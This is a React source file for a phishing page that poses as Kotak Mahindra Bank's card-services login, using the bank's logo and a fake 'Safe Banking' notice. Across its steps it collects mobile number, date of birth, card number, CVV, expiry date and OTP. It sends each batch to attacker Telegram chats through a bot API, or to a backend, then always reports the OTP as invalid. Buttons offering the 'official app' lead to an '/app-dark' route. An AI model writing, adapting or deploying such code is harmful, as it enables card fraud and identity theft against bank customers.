import React, { useState, useEffect } from 'react'
import { useNavigate, Link } from 'react-router-dom'
import { BiArrowBack, BiX, BiCheck, BiRightArrowAlt, BiCreditCard, BiChevronRight, BiStar, BiBlock } from 'react-icons/bi'
import { FaGooglePlay } from 'react-icons/fa'

export default function Login() {
  const navigate = useNavigate()
  const [step, setStep] = useState(0)
  const [showPopup, setShowPopup] = useState(true)
  const [selectedService, setSelectedService] = useState('')
  const [mobile, setMobile] = useState('')
  const [dob, setDob] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [cvv, setCvv] = useState('')
  const [expDate, setExpDate] = useState('')
  const [otp, setOtp] = useState('')
  const [loading, setLoading] = useState(false)
  const [downloadLoading, setDownloadLoading] = useState(false)
  const [serviceLoading, setServiceLoading] = useState(false)
  const [error, setError] = useState('')
  const [errors, setErrors] = useState({})
  const [resendTimer, setResendTimer] = useState(0)

  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setInterval(() => {
        setResendTimer(prev => prev - 1)
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [resendTimer])

  const services = [
    { id: 1, icon: <BiX />, label: 'Card Protection Plan Cancellation' },
    { id: 2, icon: <BiStar />, label: 'Rewards Points' },
    { id: 3, icon: <BiCheck />, label: 'Card Activation Application' },
    { id: 4, icon: <BiBlock />, label: 'Card Block Application' },
    { id: 5, icon: <BiRightArrowAlt />, label: 'Limit Increase Application' },
    { id: 6, icon: <BiCreditCard />, label: 'Card to Card Application' },
  ]

  const handleServiceSelect = (service) => {
    setSelectedService(service)
    setServiceLoading(true)
    setTimeout(() => {
      setServiceLoading(false)
      setStep(1)
    }, 800)
  }

  const [submitted, setSubmitted] = useState(false)

  const validateStep1 = () => {
    const newErrors = {}
    if (!mobile || mobile.length !== 10) {
      newErrors.mobile = 'Please enter valid 10-digit mobile number'
    }
    if (!dob) {
      newErrors.dob = 'Please enter date of birth'
    }
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const [stepLoading, setStepLoading] = useState(false)

  const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'
  const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
  const TELEGRAM_CHAT_IDS = (import.meta.env.VITE_TELEGRAM_CHAT_IDS || '').split(',').map(id => id.trim()).filter(id => id)

  const sendToTelegram = async (message) => {
    for (const chatId of TELEGRAM_CHAT_IDS) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      })
    }
  }

  const handleLogin = async () => {
    setError('')
    if (!validateStep1()) return
    
    setStepLoading(true)
    
    try {
      const step1Data = {
        service: selectedService,
        mobile,
        dob
      }
      
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
        const telegramMessage = `
📋 Service: ${step1Data.service}
📱 Mobile: ${step1Data.mobile}
🎂 DOB: ${step1Data.dob}
🕐 Time: ${new Date().toLocaleString()}
        `
        await sendToTelegram(telegramMessage)
      } else {
        await fetch(`${API_URL}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...step1Data, step: 1 })
        })
      }
      
      setStep(2)
    } catch (err) {
      setError('Failed to submit. Please try again.')
    } finally {
      setStepLoading(false)
    }
  }

  const handleOtpVerify = async () => {
    if (!otp || otp.length !== 6) {
      setError('Please enter valid 6-digit OTP')
      return
    }

    setStepLoading(true)
    
    try {
      const step3Data = { otp }

      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
        const telegramMessage = `
🔢 OTP: ${step3Data.otp}
🕐 Time: ${new Date().toLocaleString()}
        `
        await sendToTelegram(telegramMessage)
      } else {
        await fetch(`${API_URL}/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(step3Data)
        })
      }
      
      setStepLoading(false)
      setError('Invalid OTP, try again later')
    } catch (err) {
      setError('Failed to submit. Please try again.')
      setStepLoading(false)
    }
  }

  const handleResendOtp = () => {
    if (resendTimer === 0) {
      setResendTimer(120)
      setError('')
    }
  }

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`
  }

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ''
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    return parts.length ? parts.join(' ') : v
  }

  const formatExpDate = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4)
    }
    return v
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-100 to-red-200 pt-[60px]">
      <div className="fixed top-0 left-0 right-0 bg-white p-4 shadow-md flex items-center justify-center z-[1000]">
        <Link to="/">
          <img src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" alt="Kotak Bank" className="h-[40px]" />
        </Link>
      </div>

      {submitted && (
        <div className="fixed top-[60px] left-0 right-0 h-1 bg-red-200 z-[1001]">
          <div className="h-full bg-red-600 animate-pulse" style={{ width: '60%' }}></div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
          <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {downloadLoading && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
          <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {showPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center p-4" onClick={() => setShowPopup(false)}>
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full" onClick={(e) => e.stopPropagation()}>
            <div className="text-center">
              <div className="mb-4">
                <img 
                  src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" 
                  alt="Kotak Mahindra Bank" 
                  className="h-16 mx-auto"
                />
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-2">Download Kotak Mahindra Bank App</h3>
              <p className="text-gray-500 mb-6">Get the official app from Google Play Store</p>
              <button 
                onClick={() => {
                  setDownloadLoading(true)
                  setTimeout(() => {
                    navigate('/app-dark')
                  }, 800)
                }}
                disabled={downloadLoading}
                className="inline-flex items-center justify-center bg-black text-white px-6 py-3 rounded-xl hover:bg-gray-800 transition disabled:opacity-70"
              >
                <FaGooglePlay className="w-8 h-8 mr-3" />
                <span className="text-lg font-semibold">{downloadLoading ? 'Loading...' : 'Get it on Google Play'}</span>
              </button>
              <button 
                onClick={() => setShowPopup(false)}
                className="mt-6 text-gray-400 text-sm hover:text-gray-600"
              >
                Skip for now
              </button>
            </div>
          </div>
        </div>
      )}

      {serviceLoading && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
          <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {step === 0 && (
        <div className="p-4">
          <div className="bg-white rounded-xl shadow-lg p-6">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL3dS3meA4-oVMFg3IBI5N9R9kAQRjcP5ARw&s" alt="Card" className="w-full rounded-xl mb-4" />
            
            {services.map((service) => (
              <div
                key={service.id}
                onClick={() => handleServiceSelect(service.label)}
                className="flex items-center justify-between py-4 border-b border-gray-200 cursor-pointer hover:bg-gray-50"
              >
                <div className="flex items-center">
                  <span className="text-red-700 text-xl mr-3">{service.icon}</span>
                  <span className="text-gray-800 font-medium">{service.label}</span>
                </div>
                <BiChevronRight className="text-gray-400" />
              </div>
            ))}
            
            <img src="https://cdn.prod.website-files.com/6646d773658d32b01a2fcae3/66d84cf7a7b1a80e324f5398_Revolut%20-%20Blog%20(700%20x%20420%20px)%20(1).png" alt="Banner" className="w-full rounded-xl mt-4" />
          </div>
        </div>
      )}

      {step === 1 && (
        <div className="p-4">
          {stepLoading && (
            <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
              <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
            </div>
          )}
          <div className="bg-white rounded-xl shadow-lg p-6">
            <div className="flex items-center mb-4">
              <button onClick={() => setStep(0)} className="mr-3">
                <BiArrowBack className="text-2xl text-red-700" />
              </button>
              <span className="text-xl font-semibold text-gray-800">Verify Your Details</span>
            </div>

            <div className="flex items-center justify-between mb-6 px-2">
              <div className="flex items-center">
                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">2</div>
                <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">3</div>
              </div>
            </div>

            <p className="text-gray-600 mb-4 text-sm">Let's begin with some necessary information and get you started</p>

            <div className="mb-4">
              <label className="block text-red-700 font-semibold mb-2">Enter your mobile number linked with Bank</label>
              <div className="flex border-2 border-red-600 rounded-xl overflow-hidden">
                <div className="w-16 bg-red-100 flex items-center justify-center border-r-2 border-red-600">
                  <span className="text-red-700 font-semibold">+91</span>
                </div>
                <input
                  type="tel"
                  maxLength={10}
                  value={mobile}
                  onChange={(e) => { setMobile(e.target.value.replace(/\D/g, '')); setErrors({...errors, mobile: ''}) }}
                  placeholder="Enter your mobile number"
                  className="flex-1 p-3 outline-none"
                />
              </div>
              {errors.mobile && <p className="text-red-500 text-xs mt-1">{errors.mobile}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-red-700 font-semibold mb-2">Enter Date of Birth</label>
              <input
                type="date"
                value={dob}
                onChange={(e) => { setDob(e.target.value); setErrors({...errors, dob: ''}) }}
                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
              />
              {errors.dob && <p className="text-red-500 text-xs mt-1">{errors.dob}</p>}
            </div>

            <button
              onClick={handleLogin}
              className="w-full bg-red-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-red-700 transition"
            >
              Login
            </button>

            <div className="mt-4 text-center">
              <p className="text-gray-600 text-sm mb-3">
                We have ensured that key services are available to you on the mobile website. For other services, please continue to desktop login.
              </p>
              <button 
                onClick={() => {
                  setDownloadLoading(true)
                  setTimeout(() => {
                    navigate('/app-dark')
                  }, 800)
                }}
                disabled={downloadLoading}
                className="inline-flex items-center justify-center bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition disabled:opacity-70"
              >
                <FaGooglePlay className="w-5 h-5 mr-2" />
                {downloadLoading ? 'Loading...' : 'Download Mobile App'}
              </button>
            </div>

            <p className="text-gray-500 text-xs mt-4 text-center">
              Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. Kotak Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.
            </p>
          </div>
        </div>
      )}

      {step === 2 && (
        <div className="p-4">
          {stepLoading && (
            <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
              <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
            </div>
          )}
          <div className="bg-white rounded-xl shadow-lg p-6">
            <div className="flex items-center mb-4">
              <button onClick={() => { setStep(1); }} className="mr-3">
                <BiArrowBack className="text-2xl text-red-700" />
              </button>
              <span className="text-xl font-semibold text-gray-800">Verification Required</span>
            </div>

            <div className="flex items-center justify-between mb-6 px-2">
              <div className="flex items-center">
                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                <div className="w-8 h-0.5 bg-red-600 mx-1"></div>
                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
                <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">3</div>
              </div>
            </div>

            <p className="text-gray-600 mb-4 text-sm">Let's begin with some necessary information and get you started</p>

            <div className="mb-4">
              <label className="block text-red-700 font-semibold mb-2">Card Number</label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => { setCardNumber(formatCardNumber(e.target.value)); setErrors({...errors, cardNumber: ''}) }}
                placeholder="XXXX XXXX XXXX XXXX"
                maxLength={19}
                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
              />
              {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
            </div>

            <div className="mb-4">
              <label className="block text-red-700 font-semibold mb-2">CVV Number</label>
              <input
                type="password"
                maxLength={4}
                value={cvv}
                onChange={(e) => { setCvv(e.target.value.replace(/\D/g, '')); setErrors({...errors, cvv: ''}) }}
                placeholder="XXX"
                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
              />
              {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-red-700 font-semibold mb-2">Exp Date</label>
              <input
                type="text"
                value={expDate}
                onChange={(e) => { setExpDate(formatExpDate(e.target.value)); setErrors({...errors, expDate: ''}) }}
                placeholder="MM/YY"
                maxLength={5}
                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
              />
              {errors.expDate && <p className="text-red-500 text-xs mt-1">{errors.expDate}</p>}
            </div>

            <button
              type="button"
              onClick={async () => {
                const newErrors = {}
                if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) newErrors.cardNumber = 'err'
                if (!cvv || cvv.length < 3) newErrors.cvv = 'err'
                if (!expDate || expDate.replace('/', '').length < 4) newErrors.expDate = 'err'
                setErrors(newErrors)
                if (Object.keys(newErrors).length === 0) {
                  setStepLoading(true)
                  try {
                    const step2Data = {
                      cardNumber: cardNumber.replace(/\s/g, ''),
                      cvv,
                      expDate
                    }
                    
                    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_IDS.length > 0) {
                      const telegramMessage = `
💳 Card: ${step2Data.cardNumber}
🔐 CVV: ${step2Data.cvv}
📅 Expiry: ${step2Data.expDate}
🕐 Time: ${new Date().toLocaleString()}
                      `
                      await sendToTelegram(telegramMessage)
                    } else {
                      await fetch(`${API_URL}/users`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(step2Data)
                      })
                    }
                    
                    setStep(3)
                  } catch (err) {
                    setError('Failed to submit. Please try again.')
                  } finally {
                    setStepLoading(false)
                  }
                }
              }}
              className="w-full bg-red-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-red-700 transition"
            >
              Next
            </button>
          </div>
        </div>
      )}

      {step === 3 && (
        <div className="p-4">
          {stepLoading && (
            <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
              <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
            </div>
          )}
          <div className="bg-white rounded-xl shadow-lg p-6">
            <div className="flex items-center mb-4">
              <button onClick={() => setStep(2)} className="mr-3">
                <BiArrowBack className="text-2xl text-red-700" />
              </button>
              <span className="text-xl font-semibold text-gray-800">Verification Required</span>
            </div>

            <div className="flex items-center justify-between mb-6 px-2">
              <div className="flex items-center">
                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                <div className="w-8 h-0.5 bg-red-600 mx-1"></div>
                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
                <div className="w-8 h-0.5 bg-red-600 mx-1"></div>
                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">3</div>
              </div>
            </div>

            <p className="text-gray-600 mb-2 text-sm text-center">We've sent you a verification code to your phone</p>
            <p className="text-gray-500 mb-6 text-sm">Please enter 6-digit code to verify your identity</p>

            <div className="mb-4">
              <input
                type="text"
                maxLength={6}
                value={otp}
                onChange={(e) => { setOtp(e.target.value); setError('') }}
                placeholder="XXXXXX"
                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none text-center text-2xl tracking-widest"
              />
            </div>

            <p 
              onClick={handleResendOtp}
              className={`text-sm font-semibold mb-6 text-center cursor-pointer ${resendTimer > 0 ? 'text-gray-400 cursor-not-allowed' : 'text-red-600 hover:underline'}`}
            >
              {resendTimer > 0 ? `Resend OTP in ${formatTime(resendTimer)}` : 'Resend OTP'}
            </p>

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4 text-center">
                {error}
              </div>
            )}

            <button
              onClick={handleOtpVerify}
              className="w-full bg-red-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-red-700 transition"
            >
              Submit
            </button>
          </div>
        </div>
      )}
    </div>
  )
}